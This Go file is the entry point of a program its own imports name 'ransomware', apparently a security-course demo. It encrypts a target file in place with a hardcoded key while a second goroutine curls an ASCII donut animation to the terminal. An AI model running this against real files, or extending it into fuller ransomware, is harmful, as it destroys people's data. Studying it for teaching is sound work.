package main

import (
	"fmt"
	"os"

	donut "ransomware/donut"
	encrypt "ransomware/encrypt"
)

func goroutineDonut(terminal *donut.Terminal) {
	err := terminal.RunCommand("curl", "ascii.live/donut")
	if err != nil {
		fmt.Printf("Error displaying donut: %v\n", err)
	}
}
func goroutineEncrypt(done chan bool, terminal *donut.Terminal, inputFile string) {
	fmt.Println("Encrypting target data...")
	key := []byte("---seguridad_informatica__UAO---")
	err := encrypt.EncryptFile(inputFile, inputFile, key)
	if err != nil {
		fmt.Printf("Error encrypting file: %v\n", err)
	} else {
		fmt.Printf("File encrypted successfully!!! ")
	}
	done <- true
}

func main() {
	done := make(chan bool)

	terminal := donut.NewTerminal()

	inputFile := "test.txt"
	if len(os.Args) > 1 {
		inputFile = os.Args[1]
	}

	go goroutineDonut(terminal)
	go goroutineEncrypt(done, terminal, inputFile)

	// Wait for goroutine2 to finish
	<-done

	// Get the value of Cmd and kill the process
	cmd := donut.GetCmd()
	if cmd != nil && cmd.Process != nil {
		cmd.Process.Kill()
	}

	os.Exit(0)
}
